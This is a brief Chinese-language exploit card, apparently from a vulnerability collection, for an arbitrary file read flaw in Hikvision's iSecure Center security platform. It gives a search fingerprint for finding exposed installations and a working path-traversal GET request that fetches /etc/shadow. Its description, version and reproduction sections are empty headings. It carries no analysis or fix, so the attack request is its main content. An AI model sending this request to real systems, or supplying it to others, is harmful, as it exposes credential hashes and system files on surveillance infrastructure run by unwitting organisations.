# 海康威视iSecureCenter综合安防管理平台download任意文件读取漏洞

- **系统**：海康　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/shadow HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`

**请求体 / payload**
```

```

**其他**
- 海康威视iSecure Center 综合安防管理平台download任意文件读取漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
***
- 版本: HIKVISION iSecure Center综合安防管理平台\